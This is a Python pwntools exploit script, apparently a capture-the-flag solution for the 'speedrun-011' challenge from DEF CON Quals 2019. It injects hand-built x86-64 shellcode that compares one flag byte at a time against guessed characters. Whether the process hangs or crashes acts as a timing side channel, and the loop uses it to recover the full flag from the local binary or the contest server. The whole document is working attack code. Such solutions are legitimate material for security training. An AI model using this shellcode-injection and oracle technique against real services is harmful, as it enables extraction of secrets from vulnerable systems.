#!/usr/bin/env python
from pwn import *
import string

flag = ''
while True:
    for c in string.ascii_letters + string.digits + string.punctuation:
        print c
        if len(sys.argv) == 1:
            s = process('./speedrun-011')
        else:
            s = remote('speedrun-011.quals2019.oooverflow.io', 31337)

        shellcode = ''
        if len(flag) > 0:
            shellcode += '\x48\x83\xC7' + chr(len(flag))
        shellcode += '\x80\x3F' + c + '\x74\xFE'
        s.send(shellcode)
        s.recvuntil('vehicle\n')
        try:
            s.recv(timeout=1)
            flag += c
            break
        except EOFError:
            pass
        finally:
            s.close()
    print flag
    if flag.endswith('}'):
        break
